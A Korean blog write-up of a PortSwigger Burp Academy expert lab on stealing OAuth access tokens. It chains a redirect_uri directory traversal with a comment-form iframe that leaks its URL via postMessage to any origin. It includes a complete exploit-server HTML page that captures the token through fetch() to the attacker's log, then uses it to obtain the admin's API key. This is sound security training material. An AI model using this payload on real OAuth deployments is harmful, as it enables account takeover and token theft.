---
layout: post
title: "Burp Academy-OAuth 여섯번째 문제: Stealing OAuth access tokens via a proxy page"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, OAuth취약점]
toc: true
---

# 개요
- OAuth 2.0 인증에 관련된 취약점이다. 
- 취약점 설명 주소: https://portswigger.net/web-security/oauth
- 문제 주소: https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page
- 난이도: EXPERT (어려움)

# 문제 설명
- 이전 문제들과 마찬가지로 소셜미디어 계정을 이용한 OAuth 로그인 기능이 있다. 
- OAuth 서비스에는 밸리데이션 취약점이 있어서 공격자가 클라이언트의 특정 페이지에서 억세스 토큰을 훔칠 수 있다. 
- 클라이언트 어플리케이션에도 취약점이 있다. 어플리케이션을 프록시로 사용해서 억세스 토큰을 훔칠 수 있다. 
- 

```
 This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: wiener:peter. 
```


# 풀이 
어려워서 답을 보면서 진행했다. 

## 1. redirect_uri의 디렉토리 트래버셜 확인 
`GET /auth?` 요청에서 redirect_uri의 디렉토리 트래버셜이 가능한 것을 확인했다. 

```
GET /auth?client_id=wr6o9s5ajdr712wi4ghd6&redirect_uri=https://0a6100c704bed5e7823ecf6800330046.web-security-academy.net/oauth-callback/../../&response_type=token&nonce=137977735&scope=openid%20profile%20email HTTP/2
Host: oauth-0a8900da040ad56d82ddcdbc027400c5.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers


```

```
HTTP/2 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Set-Cookie: _interaction=wcINI_iR2FhkvwlvASk8q; path=/interaction/wcINI_iR2FhkvwlvASk8q; expires=Wed, 24 May 2023 00:04:38 GMT; samesite=lax; secure; httponly
Set-Cookie: _interaction_resume=wcINI_iR2FhkvwlvASk8q; path=/auth/wcINI_iR2FhkvwlvASk8q; expires=Wed, 24 May 2023 00:04:38 GMT; samesite=lax; secure; httponly
Location: /interaction/wcINI_iR2FhkvwlvASk8q
Content-Type: text/html; charset=utf-8
Date: Tue, 23 May 2023 23:54:38 GMT
Keep-Alive: timeout=5
Content-Length: 99

Redirecting to <a href="/interaction/wcINI_iR2FhkvwlvASk8q">/interaction/wcINI_iR2FhkvwlvASk8q</a>.
```

## 2. 클라이언트 어플리케이션의 취약점(iframe)발견 
`GET /post?postId=[...]` 요청의 응답을 보면 다음과 같이 커멘트를 입력하는 폼이 iframe으로 되어 있는 것을 알 수 있다. 

```html
<iframe onload='this.height = this.contentWindow.document.body.scrollHeight + "px"' width=100% frameBorder=0 src='/post/comment/comment-form#postId=1'></iframe>
```

커멘트폼에서는 다음 스크립트가 동작한다. postMessage메서드로 부모 윈도우로 `window.location.href`값을 보내도록 되어 있는 것을 알 수 있다. 그리고 postMessage의 두번째 파라메터가 '*'으로 되어 있다. 이 부분은 [postMessage 스펙](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)에 의하면 targetOrigin을 의미한다. 이 부분이 '*'로 되어 있으면 부모윈도우가 어떤 사이트여도 이 스크립트는 동작한다. 즉, exploit서버에서 이 페이지를 iframe으로 호출해도 동작할 것이다. 이 부분이 클라이언트 어플리케이션의 취약점이다. 이 것을 이용한다. 

```
<script>
    parent.postMessage({type: 'onload', data: window.location.href}, '*')
    function submitForm(form, ev) {
        ev.preventDefault();
        const formData = new FormData(document.getElementById("comment-form"));
        const hashParams = new URLSearchParams(window.location.hash.substr(1));
        const o = {};
        formData.forEach((v, k) => o[k] = v);
        hashParams.forEach((v, k) => o[k] = v);
        parent.postMessage({type: 'oncomment', content: o}, '*');
        form.reset();
    }
</script>
```

## 3. exploit서버 준비 

프록시 탭에서 `GET /auth?client_id=[...]` 요청을 찾은 다음 URL을 카피해둔다. 그리고 iframe에서 해당 URL에 접근하도록 한다. 그리고 redirect_uri부분은 디렉토리 트래버셜로 커멘트폼으로 이동되도록 만든다. 

```
<iframe src="https://oauth-0aaa00d80325b5ece6229d04021100b5.oauth-server.net/auth?client_id=mxmdzxngn6bp633fmorzm&redirect_uri=https://0a1f008f0320b5a6e6fc9fe900e1007d.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=1134627421&scope=openid%20profile%20email"></iframe>
```

## 4. 데이터를 빼오는 스크립트 추가 
exploit서버의 페이지에 다음 스크립트를 추가한다. 

```html
<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>
```

exploit서버의 전체적인 페이지는 다음과 같다. 

```html
<html>
<body>
<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>

<iframe src="https://oauth-0aaa00d80325b5ece6229d04021100b5.oauth-server.net/auth?client_id=mxmdzxngn6bp633fmorzm&redirect_uri=https://0a1f008f0320b5a6e6fc9fe900e1007d.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=1134627421&scope=openid%20profile%20email"></iframe>
</body>
</html>
```

이 스크립트는 어떻게 동작할까?

1. iframe이 먼저 동작한다. OAuth서버의 디렉토리 트래버셜 취약점 때문에 OAuth인증 후 억세스 토큰과 함게 `/post/comment/comment-form`으로 이동된다. 
2. `/post/comment/comment-form`로 이동하면 부모윈도우로 `window.location.href`의 값을 보내는 스크립트가 동작한다. 
3. `window.location.href`에는 access_token이 포함되어 있다. 
4. 부모 윈도우에 있는 스크립트가 동작한다. 구체적으로는 iframe의 postMessage 이벤트를 캐치하는 이벤트 리스너가 동작한다. `window.location.href`의 값 데이터로 받아 URL인코딩한 후 이 값을 포함해서 `GET /`로 요청한다.

## 5. exploit 시도 
준비가 끝났다. Deliver to victim버튼을 클릭한 후, 억세스 로그를 확인한다. 

그러면 다음과 같이 access_token이 포함된 요청이 있는 것을 확인할 수 있다. 

![억세스 로그 확인](/images/burp-academy-oauth-6-2.png)

access_token의 값을 얻어와서 Authorization: Bearer 헤더에 지정해서 `/me` 요청을 보낸다.  이렇게 하면 apiKey를 획득할 수 있다. 

![apiKey획득](/images/burp-academy-oauth-6-3.png)

얻은 apiKey를 문제서버에 제출하면 풀이에 성공했다는 메세지가 출력된다. 

![성공](/images/burp-academy-oauth-6-success.png)


# 참고 
- developer.mozilla.org/ja/docs/Web/API/Window/message_event
- https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage